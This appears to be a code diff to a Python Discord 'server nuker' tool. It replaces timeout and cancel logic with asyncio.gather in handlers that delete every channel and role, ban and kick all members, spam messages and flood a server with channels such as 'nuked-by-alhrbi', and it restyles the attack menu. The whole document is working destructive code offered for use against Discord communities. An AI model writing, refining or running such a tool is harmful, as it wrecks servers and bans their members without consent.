@@ -167,7 +167,7 @@ FACE = r"""
 """
 
 BYE = r"""
-                    ▬▬▬.◙.▬▬▬
+                   ▬▬▬.◙.▬▬▬
                     ═▂▄▄▓▄▄▂
                     ◢◤ █▀▀████▄▄▄◢◤
                     █▄ █ █▄ ███▀▀▀▀▀▀╬
@@ -328,15 +328,9 @@ async def handle_delete_channels(guild):
     printc(f"[+] Deleting {len(channels)} channels...")
     
     tasks = [fast_delete_channel(ch) for ch in channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    cancel_task = asyncio.create_task(wait_for_cancel())
-    
-    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
-    
-    cancel_task.cancel()
-    reset_cancel()
-    
-    printc(f"[+] Deleted {len(done)} channels!")
+    printc("[+] All channels deleted!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -354,10 +348,9 @@ async def handle_delete_roles(guild):
     printc(f"[+] Deleting {len(roles)} roles...")
     
     tasks = [fast_delete_role(r) for r in roles]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
-    
-    printc(f"[+] Deleted {len(done)} roles!")
+    printc("[+] All roles deleted!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -374,15 +367,9 @@ async def handle_create_channels(guild):
     printc(f"[+] Creating {count} channels...")
     
     tasks = [fast_create(guild, random.choice(NAMES)) for _ in range(count)]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    cancel_task = asyncio.create_task(wait_for_cancel())
-    
-    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
-    
-    cancel_task.cancel()
-    reset_cancel()
-    
-    printc(f"[+] Created {len(done)} channels!")
+    printc(f"[+] Created {count} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -400,10 +387,9 @@ async def handle_rename_channels(guild):
     printc(f"[+] Renaming {len(channels)} channels...")
     
     tasks = [fast_rename_channel(ch, random.choice(NAMES)) for ch in channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
-    
-    printc(f"[+] Renamed {len(done)} channels!")
+    printc("[+] All channels renamed!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -434,10 +420,9 @@ async def handle_rename_custom(guild):
     printc(f"[+] Renaming {len(channels)} channels...")
     
     tasks = [fast_rename_channel(ch, names[i % len(names)]) for i, ch in enumerate(channels)]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
-    
-    printc(f"[+] Renamed {len(done)} channels!")
+    printc("[+] All channels renamed!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -468,14 +453,9 @@ async def handle_send_all(guild):
         for _ in range(count):
             tasks.append(fast_send(ch, msg))
     
-    cancel_task = asyncio.create_task(wait_for_cancel())
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
-    
-    cancel_task.cancel()
-    reset_cancel()
-    
-    printc(f"[+] Sent {len(done)} messages!")
+    printc("[+] All messages sent!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -493,15 +473,9 @@ async def handle_ban_all(guild):
     printc(f"[+] Banning {len(members)} members...")
     
     tasks = [fast_ban(m) for m in members]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    cancel_task = asyncio.create_task(wait_for_cancel())
-    
-    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
-    
-    cancel_task.cancel()
-    reset_cancel()
-    
-    printc(f"[+] Banned {len(done)} members!")
+    printc(f"[+] Banned {len(members)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -519,15 +493,9 @@ async def handle_kick_all(guild):
     printc(f"[+] Kicking {len(members)} members...")
     
     tasks = [fast_kick(m) for m in members]
+    await asyncio.gather(*tasks, return_exceptions=True)
     
-    cancel_task = asyncio.create_task(wait_for_cancel())
-    
-    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
-    
-    cancel_task.cancel()
-    reset_cancel()
-    
-    printc(f"[+] Kicked {len(done)} members!")
+    printc(f"[+] Kicked {len(members)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
@@ -554,17 +522,16 @@ async def handle_nuke(guild):
     members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
     all_tasks.extend([fast_ban(m) for m in members])
     
-    done, pending = await asyncio.wait(all_tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
+    await asyncio.gather(*all_tasks, return_exceptions=True)
     
-    printc(f"[+] Nuke completed! {len(done)} actions done!")
+    printc("[+] Nuke completed!")
     
     printc("[+] Creating new channels...")
     channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
     
     create_tasks = [fast_create(guild, random.choice(channel_names)) for _ in range(50)]
-    done2, pending2 = await asyncio.wait(create_tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    await asyncio.gather(*create_tasks, return_exceptions=True)
     
-    printc(f"[+] Created {len(done2)} new channels!")
     printc("[+] Server NUKED Successfully!")
     printc("[+] Press Enter to return")
     inp("")
@@ -573,19 +540,19 @@ async def handle_nuke(guild):
 async def main_menu(guild):
     while True:
         print_logo()
-        print(YELLOW + f"Connected Server: {guild.name} (ID: {guild.id})")
-        print(YELLOW + "=" * 60)
-        print(YELLOW + "[1] Delete All Channels (FAST)")
-        print(YELLOW + "[2] Delete All Roles (FAST)")
-        print(YELLOW + "[3] Create Mass Channels (FAST)")
-        print(YELLOW + "[4] Mass Rename Channels - Random (FAST)")
-        print(YELLOW + "[5] Mass Rename Channels - Custom (FAST)")
-        print(YELLOW + "[6] Mass Send Messages (FAST)")
-        print(YELLOW + "[7] Ban All Members (FAST)")
-        print(YELLOW + "[8] Kick All Members (FAST)")
-        print(YELLOW + "[9] NUKE SERVER (FAST)")
-        print(YELLOW + "[0] Exit")
-        print(YELLOW + "=" * 60)
+        printc(f"Connected Server: {guild.name} (ID: {guild.id})")
+        printc("=" * 60)
+        printc("[1] Delete All Channels")
+        printc("[2] Delete All Roles")
+        printc("[3] Create Mass Channels")
+        printc("[4] Mass Rename Channels (Random)")
+        printc("[5] Mass Rename Channels (Custom)")
+        printc("[6] Mass Send Messages")
+        printc("[7] Ban All Members")
+        printc("[8] Kick All Members")
+        printc("[9] NUKE SERVER")
+        printc("[0] Exit")
+        printc("=" * 60)
 
         choice = inp("[?] Choice: ").strip().lower()
 
